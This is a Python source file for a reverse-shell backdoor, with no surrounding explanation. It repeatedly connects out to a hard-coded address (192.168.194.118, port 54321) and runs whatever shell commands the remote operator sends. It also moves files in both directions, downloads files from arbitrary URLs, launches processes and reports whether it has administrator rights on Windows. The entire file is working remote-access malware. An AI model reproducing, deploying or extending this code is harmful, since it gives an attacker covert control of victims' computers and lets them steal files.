#!/usr/bin/python
import socket
import subprocess
import json
import time
import os
import shutil
import threading
import sys
import base64
import requests


def reliable_send(data):
    jsondata = json.dumps(data)
    sock.send(jsondata.encode())


def reliable_recv():
    data = ''
    while True:
        try:
            data = data + sock.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def is_admin():
    global admin
    try:
        temp = os.listdir(os.sep.join(
            [os.environ.get('SystemRoot', 'C:\Windows'), 'temp']))
    except:
        admin = "[!!] User Privileges!"
    else:
        admin = "[+] Administrator Privileges!"


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, 'wb') as out_file:
        out_file.write(get_response.content)


def download_file(file_name):
    f = open(file_name, 'wb')
    sock.settimeout(1)
    chunk = sock.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = sock.recv(1024)
        except socket.timeout as e:
            break
    sock.settimeout(None)
    f.close()


def upload_file(file_name):
    f = open(file_name, 'rb')
    sock.send(f.read())


def connection():
    while True:
        time.sleep(20)
        try:
            sock.connect(('192.168.194.118', 54321))
            shell()
            sock.close()
            break
        except:
            connection()


def shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        elif command == 'background':
            pass
        elif command == 'help':
            pass
        elif command == 'clear':
            pass
        elif command[:2] == 'cd':
            os.chdir(command[3:])

        elif command[:6] == 'upload':
            download_file(command[7:])
        elif command[:8] == 'download':
            upload_file(command[9:])
        elif command[:3] == 'get':
            try:
                download(command[4:])
                reliable_send("[+] Downloded File From Specified URL!")
            except:
                reliable_send("[!!] Failed To Download File")

        elif command[:5] == 'start':
            try:
                subprocess.Popen(command[6:], shell=True)
                reliable_send("[+] Started!")
            except:
                reliable_send("[!!] Failded To Start!")
        elif command[:5] == "check":
            try:
                is_admin()
                reliable_send(admin)
            except:
                reliable_send("Can perform the Check")

        elif command[:7] == 'sendall':
            subprocess.Popen(command[8:], shell=True, stdout=subprocess.PIPE,
                             stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        else:
            execute = subprocess.Popen(
                command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
